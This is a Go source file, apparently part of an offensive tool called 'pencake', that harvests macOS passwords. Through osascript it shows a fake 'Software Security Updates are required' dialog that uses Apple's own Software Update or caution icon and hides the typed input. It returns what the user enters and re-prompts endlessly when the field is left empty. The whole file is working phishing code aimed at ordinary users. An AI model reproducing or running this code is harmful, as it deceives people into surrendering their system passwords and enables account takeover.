package pencake

import "pencake/utils"

func AskPass() string {
	switch utils.SystemType() {
	case "darwin":
		return askMacPassword()
	default:
		utils.NotSupported("")
		return ""
	}
}

const macScriptEX = "osascript -e " +
	"'Tell application \"System Events\" to display dialog " +
	"\"Software Security Updates are required.\nTo update, please enter your password:\" " +
	"buttons {\"OK\"} default button \"OK\" with hidden answer default answer \"\" " +
	"with icon file \"/System/Library/CoreServices/Software Update.app/Contents/Resources/SoftwareUpdate.icns\" " +
	"as alias' -e 'text returned of result'"

const macScriptNEXA = "osascript -e " +
	"'Tell application \"System Events\" to display dialog " +
	"\"Software Security Updates are required.\nTo update, please enter your password:\" " +
	"buttons {\"OK\"} default button \"OK\" with hidden answer default answer \"\" " +
	"with icon file \"/System/Library/CoreServices/CoreTypes.bundle/Contents/Resources/AlertCautionIcon.icns\" " +
	"as alias' -e 'text returned of result'"

const macScriptNEX = "osascript -e " +
	"'Tell application \"System Events\" to display dialog " +
	"\"Software Security Updates are required.\nTo update, please enter your password:\" " +
	"buttons {\"OK\"} default button \"OK\" with hidden answer default answer \"\" " +
	"with icon caution' -e 'text returned of result'"

func askMacPassword() string {
	software := "/System/Library/CoreServices/Software Update.app/Contents/Resources/SoftwareUpdate.icns"
	alert := "/System/Library/CoreServices/CoreTypes.bundle/Contents/Resources/AlertCautionIcon.icns"
	var userInput string
	if utils.IsFileExist(software) {
		userInput = utils.RunCommand(macScriptEX)
	} else if utils.IsFileExist(alert) {
		userInput = utils.RunCommand(macScriptNEXA)
	} else {
		userInput = utils.RunCommand(macScriptNEX)
	}
	if userInput == "" {
		return askMacPassword()
	} else {
		return userInput
	}
}
